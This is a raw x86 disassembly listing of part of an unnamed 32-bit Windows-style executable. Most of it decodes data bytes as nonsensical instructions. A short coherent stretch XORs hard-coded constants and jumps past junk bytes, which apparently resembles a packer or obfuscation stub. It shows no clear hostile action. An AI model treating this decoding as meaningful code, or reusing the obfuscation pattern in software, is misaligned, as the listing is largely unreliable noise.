  40887d:	clc    
  40887e:	sub    bl,bh
  408880:	inc    edi
  408881:	(bad)  
  408882:	dec    edi
  408883:	imul   ebp,ebx,0xffffff83
  408886:	and    ch,ah
  408888:	ins    BYTE PTR es:[edi],dx
  408889:	retf   0xcaa5
  40888c:	pop    edi
  40888d:	shl    DWORD PTR [edi+0x7b7b96ef],cl
  408893:	jecxz  0x4088b6
  408895:	inc    eax
  408896:	sti    
  408897:	add    ch,bl
  408899:	cld    
  40889a:	jle    0x408918
  40889c:	mov    esp,?
  40889e:	mov    ah,0x46
  4088a0:	outs   dx,BYTE PTR ds:[esi]
  4088a1:	jbe    0x4088ed
  4088a3:	push   ecx
  4088a4:	jbe    0x408843
  4088a6:	add    esp,0x97c1d3ed
  4088ac:	adc    al,0x37
  4088ae:	fild   WORD PTR [esi]
  4088b0:	mov    ah,0xf
  4088b2:	je     0x4088a4
  4088b4:	xor    eax,0xdca3ad4b
  4088b9:	mov    esi,0x8e76a99d
  4088be:	sub    al,0x9c
  4088c0:	jae    0x4088bf
  4088c2:	in     eax,0xd9
  4088c4:	aad    0xbb
  4088c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088c7:	mov    bh,0xc4
  4088c9:	or     eax,0x3d7f57fb
  4088ce:	(bad)  
  4088cf:	addr16 fcmovnb st,st(4)
  4088d2:	ret    
  4088d3:	add    ecx,esi
  4088d5:	jecxz  0x408926
  4088d7:	xchg   edx,eax
  4088d8:	les    edi,FWORD PTR [ecx+0x42581807]
  4088de:	mov    cl,0x77
  4088e0:	add    BYTE PTR [edi-0x45908c4],0x18
  4088e7:	ja     0x408929
  4088e9:	int    0x75
  4088eb:	jbe    0x4088f0
  4088ed:	fstp   TBYTE PTR [ecx+0x61b7b557]
  4088f4:	adc    al,0x97
  4088f6:	daa    
  4088f7:	xlat   BYTE PTR ds:[ebx]
  4088f8:	fadd   QWORD PTR [ebp+0x28]
  4088fb:	ret    
  4088fc:	mov    al,0x30
  4088fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088ff:	popf   
  408900:	jmp    0x75cb:0x3929d005
  408907:	jmp    0x5889b711
  40890c:	lock sbb bh,BYTE PTR [ecx+0x6a6c8ddd]
  408913:	aad    0x2f
  408915:	or     BYTE PTR [ecx],0x54
  408918:	sbb    al,0x1e
  40891a:	cli    
  40891b:	stc    
  40891c:	mul    DWORD PTR [esi-0x1c]
  40891f:	cmp    esi,DWORD PTR [edi]
  408921:	inc    esp
  408922:	add    al,0x46
  408924:	cs add al,0x8d
  408927:	stos   BYTE PTR es:[edi],al
  408928:	cmp    ah,BYTE PTR [ebx]
  40892a:	stc    
  40892b:	pop    ss
  40892c:	dec    edi
  40892d:	add    al,bl
  40892f:	lds    eax,FWORD PTR ds:0xe7fec920
  408935:	jmp    0x40892e
  408937:	add    ecx,DWORD PTR [eax-0xf]
  40893a:	fsubr  DWORD PTR [eax]
  40893c:	cdq    
  40893d:	add    BYTE PTR [edx+edx*1-0x36778878],dl
  408944:	aad    0x3b
  408946:	ficom  WORD PTR [eax+0x19]
  408949:	xchg   edi,eax
  40894a:	fwait
  40894b:	jns    0x4089ba
  40894d:	test   eax,0xd4615ab6
  408952:	xor    al,0x76
  408954:	leave  
  408955:	sbb    DWORD PTR [edx],ebx
  408957:	sub    BYTE PTR [eax+0x20f3e03a],cl
  40895d:	pop    es
  40895e:	jns    0x4089d3
  408960:	hlt    
  408961:	hlt    
  408962:	les    eax,FWORD PTR [esi-0x5dba9133]
  408968:	xor    BYTE PTR [ebx+0x51],dl
  40896b:	mov    esi,0x6a4f404d
  408970:	xor    BYTE PTR [eax],al
  408972:	fdivr  QWORD PTR [edi+0x55]
  408975:	lods   al,BYTE PTR ds:[esi]
  408976:	push   0xffffffc9
  408978:	retf   0x8512
  40897b:	add    eax,0xdce93d14
  408981:	ins    BYTE PTR es:[edi],dx
  408982:	mov    bl,0x68
  408984:	adc    edi,edx
  408986:	stos   DWORD PTR es:[edi],eax
  408987:	cld    
  408988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408989:	adc    al,0xc5
  40898b:	ins    DWORD PTR es:[edi],dx
  40898c:	cmp    BYTE PTR [esi+edi*8+0x2a99ce87],ah
  408993:	cs adc al,0x81
  408996:	stos   BYTE PTR es:[edi],al
  408997:	sub    al,0x1c
  408999:	xor    ebx,eax
  40899b:	and    ebx,ecx
  40899d:	or     cl,bl
  40899f:	inc    esp
  4089a0:	loopne 0x40898b
  4089a2:	imul   ebx,DWORD PTR [eax],0xffffffe8
  4089a5:	outs   dx,DWORD PTR ds:[esi]
  4089a6:	cmc    
  4089a7:	enter  0x2375,0x79
  4089ab:	xor    eax,0xf85f2cb3
  4089b0:	fistp  QWORD PTR [ebx+0x3077e4ee]
  4089b6:	fsubr  DWORD PTR [esi]
  4089b8:	dec    edi
  4089b9:	jge    0x408a36
  4089bb:	dec    ecx
  4089bc:	pop    ds
  4089bd:	leave  
  4089be:	fxam   
  4089c0:	pop    es
  4089c1:	pop    esi
  4089c2:	test   eax,0xe88b4468
  4089c7:	mov    ecx,0x281170c4
  4089cc:	pop    eax
  4089cd:	leave  
  4089ce:	xor    al,0xc6
  4089d0:	sub    eax,0x4f3ffb38
  4089d5:	test   BYTE PTR [esi+0x68],dh
  4089d8:	fidiv  WORD PTR [edi-0x7c]
  4089db:	fistp  QWORD PTR [esi-0x3f64679b]
  4089e1:	sub    DWORD PTR ds:0x8fb56ed4,edi
  4089e7:	or     BYTE PTR [ecx],al
  4089e9:	outs   dx,BYTE PTR ss:[esi]
  4089eb:	cmp    ebx,DWORD PTR [esi]
  4089ed:	cmp    DWORD PTR [ecx+edi*4],ecx
  4089f0:	sar    BYTE PTR [eax],1
  4089f2:	cmp    DWORD PTR [eax-0x137c157a],ebp
  4089f8:	scas   eax,DWORD PTR es:[edi]
  4089f9:	jo     0x4089b9
  4089fb:	sub    edx,DWORD PTR [edx]
  4089fd:	mov    DWORD PTR [ecx],eax
  4089ff:	(bad)  
  408a01:	push   0xb7714902
  408a06:	adc    DWORD PTR [esp+edx*2-0x75],eax
  408a0a:	mov    cl,0x7
  408a0c:	mov    ch,0xa8
  408a0e:	and    al,0x77
  408a10:	pushf  
  408a11:	xchg   ebp,eax
  408a12:	aas    
  408a13:	xchg   DWORD PTR [esi+0x5b],ecx
  408a16:	and    BYTE PTR [eax],0x9a
  408a19:	inc    edi
  408a1a:	dec    edi
  408a1b:	sbb    al,0xe0
  408a1d:	xor    BYTE PTR [edi+0x43],0xb3
  408a21:	stos   BYTE PTR es:[edi],al
  408a22:	and    dh,BYTE PTR [ebx-0xf]
  408a25:	(bad)  
  408a26:	jae    0x408a58
  408a28:	mov    edx,0x87f31e98
  408a2d:	jne    0x408a69
  408a2f:	lahf   
  408a30:	cmp    BYTE PTR [ebp+esi*1-0x5f9b129c],bl
  408a37:	push   edx
  408a38:	or     BYTE PTR cs:[edi],cl
  408a3b:	gs ror ah,cl
  408a3e:	or     BYTE PTR [esi],0xf9
  408a41:	fcmovbe st,st(0)
  408a43:	out    0x4e,eax
  408a45:	xor    BYTE PTR [ebx],bh
  408a47:	xchg   ecx,eax
  408a48:	push   ss
  408a49:	mov    BYTE PTR [edx+0x7a],bh
  408a4c:	xchg   esi,eax
  408a4d:	pop    ecx
  408a4e:	cwde   
  408a4f:	lahf   
  408a50:	cmp    al,0xd9
  408a52:	cmc    
  408a53:	jge    0x408a5e
  408a55:	cmp    BYTE PTR [edx+edi*2-0x4a554446],dl
  408a5c:	xor    BYTE PTR [ecx-0x7926ae12],ah
  408a62:	loopne 0x408ab9
  408a64:	inc    ebx
  408a65:	sbb    bh,BYTE PTR [edi+0x1a32e63e]
  408a6b:	sub    eax,0x89f8ede0
  408a70:	add    DWORD PTR [esi-0x37],ebx
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0x17b3a4f9
  408a92:	ret    0x9f07
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408ad1
  408a9e:	mov    edx,0x24d62450
  408aa3:	arpl   sp,si
  408aa5:	sbb    eax,DWORD PTR [edx+0x7d3a3866]
  408aab:	aad    0x3a
  408aad:	shl    DWORD PTR [edi],cl
  408aaf:	xchg   esp,eax
  408ab0:	into   
  408ab1:	cmp    eax,0x23845811
  408ab6:	mov    ds:0x731e0298,al
  408abb:	fisttp QWORD PTR [edx-0x131439f0]
  408ac1:	mov    dl,0x99
  408ac3:	jmp    0xdb09:0xbc8ed318
  408aca:	lods   eax,DWORD PTR ds:[esi]
  408acb:	dec    ebx
  408acc:	dec    edi
  408acd:	call   0xa97:0xd1b0a26e
  408ad4:	adc    BYTE PTR [edi],dh
  408ad6:	clc    
  408ad7:	sbb    ecx,edx
  408ad9:	sub    eax,0x1c1d718a
  408ade:	add    al,0x9b
  408ae0:	mov    al,ds:0x45a7930f
  408ae5:	clc    
  408ae6:	sbb    edx,DWORD PTR [edi+ebx*4-0x63]
  408aea:	jecxz  0x408b01
  408aec:	test   DWORD PTR [ecx-0x3f],ecx
  408aef:	sub    BYTE PTR [eax-0x69],al
  408af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408af3:	xchg   ecx,eax
  408af4:	inc    edx
  408af5:	push   ss
  408af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408af7:	push   esp
  408af8:	adc    esi,DWORD PTR [eax-0x65]
  408afb:	nop
  408afc:	sub    esi,ebx
  408afe:	xor    al,0x5a
  408b00:	push   ss
  408b01:	and    ecx,esp
  408b03:	icebp  
  408b04:	and    ch,BYTE PTR [eax+0x58]
  408b07:	inc    ecx
  408b08:	xor    ch,bh
  408b0a:	adc    ebx,DWORD PTR [edi+0x200df222]
  408b10:	mov    eax,ds:0x428d69ce
  408b15:	add    ebx,DWORD PTR [esi]
  408b17:	dec    esi
  408b18:	xchg   esi,eax
  408b19:	das    
  408b1a:	sub    ebx,DWORD PTR [esi+0x25]
  408b1d:	xchg   edx,eax
  408b1e:	call   0x35e16abf
  408b23:	scas   al,BYTE PTR es:[edi]
  408b24:	mov    ds:0xa33935e2,eax
  408b29:	adc    al,0xb9
  408b2b:	(bad)  
  408b2c:	jmp    0x6339fc29
  408b31:	icebp  
  408b32:	enter  0x2428,0x47
  408b36:	sbb    DWORD PTR [esi+0xe],ecx
  408b39:	sbb    BYTE PTR [esi-0x74],ah
  408b3c:	pop    ebp
  408b3d:	fbld   TBYTE PTR [ecx+eiz*2+0x60]
  408b41:	pop    esi
  408b42:	(bad)  
  408b43:	dec    ebx
  408b44:	push   esp
  408b45:	icebp  
  408b46:	stos   DWORD PTR es:[edi],eax
  408b47:	scas   eax,DWORD PTR es:[edi]
  408b48:	ficomp WORD PTR [ebp+0x3d]
  408b4b:	mov    ebx,0xbaa031c
  408b50:	add    al,0xac
  408b52:	addr16 in al,0x6b
  408b55:	jno    0x408b2f
  408b57:	sub    eax,0x93129739
  408b5c:	xor    eax,0xea647b4c
  408b61:	sub    dh,BYTE PTR [edx-0x12]
  408b64:	cmp    ebx,DWORD PTR [ebx-0x53]
  408b67:	retf   0x732b
  408b6a:	dec    eax
  408b6b:	loopne 0x408aed
  408b6d:	mov    cl,0x73
  408b6f:	and    al,0x52
  408b71:	lahf   
  408b72:	mov    ds:0x68714b98,al
  408b77:	xchg   ebx,eax
  408b78:	cmp    BYTE PTR [esi],0x45
  408b7b:	nop
  408b7c:	jne    0x408b80
  408b7e:	jo     0x408b58
  408b80:	sbb    ah,BYTE PTR [ecx-0x72fa2510]
  408b86:	mov    esp,0x462e141e
  408b8b:	mov    ds:0x4597ca9a,al
  408b90:	das    
  408b91:	ret    0x7051
  408b94:	aaa    
  408b95:	sbb    al,0xd8
  408b97:	pop    esi
  408b98:	jnp    0x408c15
  408b9a:	jmp    0x4228:0x18959b0a
  408ba1:	ins    DWORD PTR es:[edi],dx
  408ba2:	mov    ds:0x26ec1f18,eax
  408ba7:	push   ecx
  408ba8:	mov    edi,0xea9fe4ae
  408bad:	inc    ebp
  408bae:	scas   eax,DWORD PTR es:[edi]
  408baf:	sub    DWORD PTR [edi+ecx*2-0x6e],ecx
  408bb3:	shl    ebp,0xa5
  408bb6:	test   BYTE PTR [ebx+edx*1+0x2e],dh
  408bba:	inc    edx
  408bbb:	cmc    
  408bbc:	int    0x23
  408bbe:	or     DWORD PTR [esi-0x7ab9f51f],eax
  408bc4:	arpl   WORD PTR es:[esi+0x6704aabe],bx
  408bcb:	cmp    ah,BYTE PTR [edx]
  408bcd:	adc    eax,0x696e8800
  408bd2:	call   0x4b13136b
  408bd7:	adc    al,cl
  408bd9:	xchg   BYTE PTR [esi+0x5],dh
  408bdc:	retf   0x89d4
  408bdf:	aam    0x93
  408be1:	sub    al,0x57
  408be3:	(bad)  
  408be5:	pushf  
  408be6:	enter  0x952a,0x70
  408bea:	in     eax,0x48
  408bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bed:	sbb    DWORD PTR [ebp+0x6e4d464b],ecx
  408bf3:	mov    DWORD PTR [edi+edx*1-0x56a4600a],edi
  408bfa:	lahf   
  408bfb:	pop    ds
  408bfc:	std    
  408bfd:	jmp    0xf098:0x17dfd931
  408c04:	jmp    0x5be4:0xa98e7386
  408c0b:	lods   al,BYTE PTR ds:[esi]
  408c0c:	xchg   esi,eax
  408c0d:	cmc    
  408c0e:	(bad)  [ecx]
  408c10:	(bad)  
  408c11:	fistp  QWORD PTR [eax+0x7fa7259c]
  408c17:	mov    ch,0x43
  408c19:	sbb    BYTE PTR [ebp+0x29ec86a1],0x2
  408c20:	pop    ds
  408c21:	jo     0x408ba8
  408c23:	stos   BYTE PTR es:[edi],al
  408c24:	xor    al,0x2a
  408c26:	cwde   
  408c27:	inc    edi
  408c28:	das    
  408c29:	or     esi,esp
  408c2b:	mov    eax,ds:0x5b033586
  408c30:	scas   eax,DWORD PTR es:[edi]
  408c31:	mov    bl,0xba
  408c33:	pop    esi
  408c34:	cmp    dl,ah
  408c36:	inc    BYTE PTR [ebx-0x6a]
  408c39:	xor    al,0xfd
  408c3b:	cmc    
  408c3c:	call   0xf4a9f969
  408c41:	loop   0x408c93
  408c43:	inc    ecx
  408c44:	pushf  
  408c45:	sub    BYTE PTR [ebp-0xe5ea2a8],cl
  408c4b:	gs pop edi
  408c4d:	xchg   esi,eax
  408c4e:	xor    al,0x4e
  408c50:	sbb    esp,DWORD PTR [edx]
  408c52:	mov    esp,0x3a4483aa
  408c57:	jbe    0x408cb0
  408c59:	data16 fisub WORD PTR [ebx]
  408c5c:	dec    edx
  408c5d:	xchg   DWORD PTR [esi-0x490bdfb0],esp
  408c63:	neg    BYTE PTR [eax]
  408c65:	inc    eax
  408c66:	xchg   ebx,eax
  408c67:	xchg   esi,eax
  408c68:	out    0x69,al
  408c6a:	or     DWORD PTR [ebp+eax*2+0x35],ecx
  408c6e:	ja     0x408c1c
  408c70:	inc    eax
  408c71:	fwait
  408c72:	inc    cl
  408c74:	pop    ss
  408c75:	mov    dl,0xbb
  408c77:	push   ebp
  408c78:	mov    ebp,0x525012c0
  408c7d:	or     BYTE PTR [ebx+0x4e],ch
  408c80:	xor    DWORD PTR [ebx],edx
  408c82:	test   al,0x47
  408c84:	cli    
  408c85:	mov    ds:0xfe15ec6e,al
  408c8a:	mov    cl,0x33
  408c8d:	es cmp edi,ebx
  408c90:	je     0x408c4e
  408c92:	outs   dx,BYTE PTR ds:[esi]
  408c93:	mov    ah,0xe0
  408c95:	inc    ebx
  408c96:	xchg   ebp,eax
  408c97:	xchg   ebp,eax
  408c98:	jne    0x408c9d
  408c9a:	ins    BYTE PTR es:[edi],dx
  408c9b:	int    0xd3
  408c9d:	xchg   ecx,eax
  408c9e:	lock jmp 0x882ad245
  408ca4:	sub    BYTE PTR [ebx],dh
  408ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca7:	sub    eax,0xdf1c1885
  408cac:	out    dx,al
  408cad:	mov    BYTE PTR [ebp-0xf],bh
  408cb0:	data16 mov WORD PTR [eax],cs
  408cb3:	fisttp QWORD PTR ss:[eax+eiz*1]
  408cb7:	stos   BYTE PTR es:[edi],al
  408cb8:	or     BYTE PTR [ebx+0x686a357d],bl
  408cbe:	inc    esi
  408cbf:	xor    eax,0x468577bc
  408cc4:	jno    0x408d0e
  408cc6:	ret    0xedbc
  408cc9:	sti    
  408cca:	sub    esp,edi
  408ccc:	lock mov ss,WORD PTR [edx+eax*2-0x49]
  408cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cd2:	mov    ds:0x66e6d823,al
  408cd7:	xchg   DWORD PTR [eax-0x74],ecx
  408cda:	dec    esp
  408cdb:	cmp    BYTE PTR [ebx],bl
  408cdd:	pop    esp
  408cde:	sti    
  408cdf:	mov    dh,0x30
  408ce1:	or     DWORD PTR [eax],ebx
  408ce3:	out    dx,eax
  408ce4:	shl    DWORD PTR [ebx+0x5],0xa
  408ce8:	inc    edx
  408ce9:	add    BYTE PTR [edi+eax*4+0xf],cl
  408ced:	or     ah,0xe2
  408cf0:	loopne 0x408c9f
  408cf2:	nop
  408cf3:	push   ds
  408cf4:	inc    ebp
  408cf5:	sbb    eax,0xa9eb752f
  408cfa:	mov    dl,0x2f
  408cfc:	mov    ebx,0xd176ed87
  408d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d02:	mov    cl,0xf2
  408d04:	pop    ss
  408d05:	loopne 0x408d02
  408d07:	adc    eax,0x63c97a97
  408d0c:	sbb    ebp,DWORD PTR [edx-0x22bee511]
  408d12:	sbb    bl,ch
  408d14:	inc    ebx
  408d15:	inc    esi
  408d16:	or     ecx,ebp
  408d18:	hlt    
  408d19:	inc    ecx
  408d1a:	jns    0x408d89
  408d1c:	push   ds
  408d1d:	test   al,0xad
  408d1f:	push   edx
  408d20:	mov    dl,BYTE PTR [eax]
  408d22:	(bad)  
  408d23:	xchg   ebp,eax
  408d24:	xchg   edx,eax
  408d25:	pop    ds
  408d26:	push   eax
  408d27:	jmp    0x408d6c
  408d29:	sahf   
  408d2a:	adc    DWORD PTR [ebx-0x40d93c8c],ecx
  408d30:	sbb    eax,0x31e8155e
  408d35:	stos   DWORD PTR es:[edi],eax
  408d36:	sub    esp,DWORD PTR [ecx]
  408d38:	ret    0x9f7
  408d3b:	dec    eax
  408d3c:	mov    bl,0x1f
  408d3e:	jae    0x408d47
  408d40:	sub    al,0x18
  408d42:	dec    edx
  408d43:	mov    bl,0xb
  408d45:	std    
  408d46:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  408d4d:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  408d54:	mov    eax,DWORD PTR [ebp-0x4]
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xffffffe9
  408e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e1e:	loope  0x408e9d
  408e20:	addr16 jmp 0x7878:0x7ea77878
  408e28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e29:	push   esp
  408e2a:	mov    BYTE PTR [edx-0x20a16c8c],bl
  408e30:	mov    al,ds:0xf7564f05
  408e35:	ss ret 0x4288
  408e39:	and    eax,0x7bb4efcb
  408e3e:	sbb    al,0x36
  408e40:	pop    esi
  408e41:	fs je  0x408e7f
  408e44:	(bad)  
  408e45:	not    bl
  408e47:	cmp    eax,0x978f4c77
  408e4c:	push   esp
  408e4d:	pop    esi
  408e4e:	popfw  
  408e50:	cmp    al,0x56
  408e52:	inc    edi
  408e53:	and    edx,eax
  408e55:	mov    bl,0x5f
  408e57:	adc    ebx,DWORD PTR [eax+0x6a]
  408e5a:	cs inc edi
  408e5c:	jbe    0x408de1
  408e5e:	punpckldq mm5,mm2
  408e61:	push   ecx
  408e62:	in     eax,dx
  408e63:	inc    esi
  408e64:	mov    eax,0xa60f6fdc
  408e69:	xchg   esi,eax
  408e6a:	jcxz   0x408eaf
  408e6d:	push   esp
  408e6e:	mov    dh,0x74
  408e70:	dec    ecx
  408e71:	push   edi
  408e72:	test   eax,0xffcad34c
  408e77:	push   cs
  408e78:	sbb    ebx,DWORD PTR [ecx+0x4f]
  408e7b:	and    BYTE PTR es:[ebx+0x60],ch
  408e7f:	imul   ebx,DWORD PTR [esi+edx*4-0x74],0x51
  408e84:	dec    eax
  408e85:	xor    ecx,DWORD PTR [ebp+0x73]
  408e88:	sbb    ecx,DWORD PTR [ebp+0x26]
  408e8b:	mov    bh,0x4f
  408e8d:	push   cs
  408e8e:	lock mov ds:0xcdd6867e,al
  408e94:	mov    al,0x13
  408e96:	icebp  
  408e97:	repnz sbb DWORD PTR [edi+edi*8+0x333c45d7],0x2cbd6d8
  408ea3:	jg     0x408e57
  408ea5:	xor    ebx,DWORD PTR [esi-0x1c37f431]
  408eab:	sub    ebp,DWORD PTR [edx+0x2d6ac04c]
  408eb1:	dec    esi
  408eb2:	pop    edx
  408eb3:	lahf   
  408eb4:	jns    0x408e89
  408eb6:	and    al,0xa7
  408eb8:	fidiv  DWORD PTR [ebp+0x44c55492]
  408ebe:	outs   dx,DWORD PTR ds:[esi]
  408ebf:	aaa    
  408ec0:	pop    ebx
  408ec1:	sub    eax,0x93023e71
  408ec6:	(bad)  
  408ec7:	out    dx,eax
  408ec8:	test   eax,0xce95528c
  408ecd:	fiadd  WORD PTR [edx]
  408ecf:	add    eax,0xebe07786
  408ed4:	(bad)  
  408ed6:	out    dx,eax
  408ed7:	popa   
  408ed8:	jnp    0x408eae
  408eda:	sahf   
  408edb:	in     eax,0x88
  408edd:	test   DWORD PTR [esi-0x62],ecx
  408ee0:	sub    al,0xef
  408ee2:	xlat   BYTE PTR ds:[ebx]
  408ee3:	inc    esp
  408ee4:	enter  0xcd6e,0x6b
  408ee8:	jb     0x408eb7
  408eea:	mov    bl,0x20
  408eec:	mov    ebp,0xacf1b1c0
  408ef1:	retf   
  408ef2:	aad    0x45
  408ef4:	and    DWORD PTR [edx+0x5f],esp
  408ef7:	inc    edi
  408ef8:	fnstcw WORD PTR [ebx]
  408efa:	xchg   ecx,eax
  408efb:	aad    0xc2
  408efd:	fwait
  408efe:	dec    esi
  408eff:	sbb    al,0xe2
  408f01:	mov    ch,0xcc
  408f03:	cmp    DWORD PTR [ecx],ebp
  408f05:	rcl    BYTE PTR [eax],0xb0
  408f08:	imul   edi,esp,0x11
  408f0b:	mov    ecx,0x7e4ffa36
  408f10:	xchg   DWORD PTR [eax-0x96d9513],eax
  408f16:	dec    eax
  408f17:	jg     0x408f1e
  408f19:	adc    eax,DWORD PTR [edi-0x7d0cae8e]
  408f1f:	adc    esi,DWORD PTR [eax+0x1e84b12a]
  408f25:	adc    edi,DWORD PTR [edi+0x336758a9]
  408f2b:	lods   eax,DWORD PTR ds:[esi]
  408f2c:	jl     0x408ee2
  408f2e:	int    0x7b
  408f30:	out    dx,eax
  408f31:	in     al,dx
  408f32:	sti    
  408f33:	in     eax,dx
  408f34:	mov    ecx,0xb5129dce
  408f39:	lods   al,BYTE PTR ds:[esi]
  408f3a:	imul   ecx,DWORD PTR [eax-0x3b811791],0xae2f0873
  408f44:	outs   dx,BYTE PTR ds:[esi]
  408f45:	into   
  408f46:	outs   dx,DWORD PTR ds:[esi]
  408f47:	fs pop ss
  408f49:	xlat   BYTE PTR ds:[ebx]
  408f4a:	ins    BYTE PTR es:[edi],dx
  408f4b:	pop    es
  408f4c:	jne    0x408f48
  408f4e:	out    dx,eax
  408f4f:	mov    eax,ds:0xade44032
  408f54:	bound  eax,QWORD PTR [edx+ebp*8+0x3]
  408f58:	cdq    
  408f59:	dec    ecx
  408f5a:	call   0xcc743b9e
  408f5f:	stos   DWORD PTR es:[edi],eax
  408f60:	scas   al,BYTE PTR es:[edi]
  408f61:	mov    ebx,0x9f8a9f73
  408f66:	sub    dh,BYTE PTR ds:0x1ef6665e
  408f6c:	push   esp
  408f6d:	xor    DWORD PTR [eax+0x3e],ecx
  408f70:	mov    cl,0x67
  408f72:	pop    esi
  408f73:	lods   al,BYTE PTR ds:[esi]
  408f74:	mov    ss,esp
  408f76:	mov    edx,0x41829f8
  408f7b:	wbinvd 
  408f7d:	jp     0x408fb9
  408f7f:	and    ax,0xfe6e
  408f83:	daa    
  408f84:	jl     0x408fc4
  408f86:	shr    ah,0xbc
  408f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f8a:	ja     0x40900b
  408f8c:	adc    edx,esp
  408f8e:	push   ds
  408f8f:	push   ds
  408f90:	pop    eax
  408f91:	adc    BYTE PTR [ecx+ecx*2],0xda
  408f95:	arpl   di,bp
  408f97:	mov    ebp,0x4b47e50d
  408f9c:	mov    esi,0x54235f07
  408fa1:	inc    ebx
  408fa2:	int    0xfc
  408fa4:	mov    esp,0x2ddbc719
  408fa9:	popf   
  408faa:	in     eax,0x98
  408fac:	test   eax,0x1f8c6bc9
  408fb1:	lea    esp,[esi-0x29]
  408fb4:	icebp  
  408fb5:	lea    esi,gs:[esi+eiz*4+0x4f0b1786]
  408fbd:	cmp    al,0x94
  408fbf:	add    al,0x99
  408fc1:	add    eax,0x8a1891d8
  408fc6:	out    dx,al
  408fc7:	mov    ah,0xb0
  408fc9:	adc    al,ah
  408fcb:	icebp  
  408fcc:	ret    
  408fcd:	cs dec edi
  408fcf:	sub    eax,0xc80ec2e5
  408fd4:	jns    0x408f85
  408fd6:	shr    BYTE PTR [edi-0x52],cl
  408fd9:	push   0x51
  408fdb:	test   BYTE PTR [ebp+0x2c],cl
  408fde:	scas   al,BYTE PTR es:[edi]
  408fdf:	or     edi,DWORD PTR [edx+0x11]
  408fe2:	arpl   WORD PTR [ebx+0x2d],ax
  408fe5:	iret   
  408fe6:	add    al,0x97
  408fe8:	pop    ebx
  408fe9:	push   ebp
  408fea:	mov    cl,0xf2
  408fec:	inc    edx
  408fed:	nop
  408fee:	and    al,0xd
  408ff0:	pop    ecx
  408ff1:	xchg   ebp,eax
  408ff2:	xor    bl,BYTE PTR [edx-0xeba9ef0]
  408ff8:	jecxz  0x409013
  408ffa:	clc    
  408ffb:	mov    BYTE PTR [esp+edx*8],bl
  408ffe:	test   BYTE PTR ds:0xc4620877,0xdf
  409005:	xor    al,0x29
  409007:	(bad)  
  409008:	in     eax,dx
  409009:	call   FWORD PTR [eax]
  40900b:	push   ds
  40900c:	sbb    dl,BYTE PTR [ecx]
  40900e:	mov    ch,0x44
  409010:	mov    WORD PTR [esi],ss
  409012:	mov    al,0x61
  409014:	and    al,0x94
  409016:	mov    ebp,DWORD PTR [ebx]
  409018:	mov    cl,0x54
  40901a:	outs   dx,BYTE PTR ds:[esi]
  40901b:	sti    
  40901c:	cmp    bl,BYTE PTR [ecx+0x547be698]
  409022:	pop    es
  409023:	or     dl,BYTE PTR [ebx]
  409025:	dec    ebx
  409026:	mov    ds:0xc5fa8b35,eax
  40902b:	sti    
  40902c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40902d:	test   al,0xc0
  40902f:	mov    ds:0x37a68ccf,eax
  409034:	sub    al,dh
  409036:	sti    
  409037:	sub    eax,0x1c33b335
  40903c:	fiadd  WORD PTR [esi+0x1b234cf4]
  409042:	sub    al,0xb1
  409044:	jb     0x408fe8
  409046:	outs   dx,BYTE PTR ds:[esi]
  409047:	aam    0x5e
  409049:	daa    
  40904a:	push   DWORD PTR [ebx+eiz*1]
  40904d:	push   ebx
  40904e:	ja     0x4090ab
  409050:	jge    0x408fda
